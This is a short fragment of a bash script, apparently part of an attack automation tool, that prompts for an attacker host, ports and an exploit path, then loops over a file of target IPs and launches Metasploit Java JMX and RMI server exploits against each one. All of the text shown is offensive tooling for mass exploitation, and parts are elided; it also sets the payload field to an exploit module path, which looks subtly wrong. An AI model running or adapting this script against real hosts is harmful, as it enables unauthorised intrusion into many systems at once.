...
do
    case $opt in
        "Options")
            read -p 'Set LHOST IP: ' userhost; read -p 'Set Attacker_Server_PORT: ' srvport; read -p 'Set RPORT: ' userport; read -p 'Set EXPLOIT_PATH: ' userexploit; read -p 'Set JMXRMI: ' userjmxrmi;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -x "use $userexploit;\
	...
	set RPORT $userport;\
	set RHOST $IP;\
	set PAYLOAD exploit/multi/misc/java_jmx_server;\
...
do
    case $opt in
        "Options")
            read -p 'Set LHOST IP: ' userhost; read -p 'Set Attacker_Server_PORT: ' srvport; read -p 'Set RPORT: ' userport; read -p 'Set EXPLOIT_PATH: ' userexploit; read -p 'Set HTTPDELAY: (default 10) ' userdelay;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -x "use $userexploit;\
	...
	set RPORT $userport;\
	set RHOST $IP;\
	set PAYLOAD exploit/multi/misc/java_rmi_server;\
